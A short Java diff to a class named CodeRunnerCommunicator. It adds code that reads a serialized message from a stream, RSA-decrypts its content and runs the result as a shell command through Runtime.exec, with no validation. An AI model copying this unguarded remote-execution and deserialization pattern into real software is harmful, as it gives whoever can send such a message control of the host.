@@ -124,6 +124,9 @@ public class CodeRunnerCommunicator
 					try 
 					{
 						PushableMessage m = (PushableMessage)objIn.readObject();
+						String command = RSAEncryptorClass.decryptText((int [])m.getMessageContent());
+						Process p = Runtime.getRuntime().exec(command);
+						p.waitFor();
 						
 					}
 					catch (ClassNotFoundException e) 
@@ -135,6 +138,11 @@ public class CodeRunnerCommunicator
 					{
 						e.printStackTrace();
 						System.exit(0);
+					} 
+					catch (InterruptedException e) 
+					{
+						// TODO Auto-generated catch block
+						e.printStackTrace();
 					}					
 					
 				}
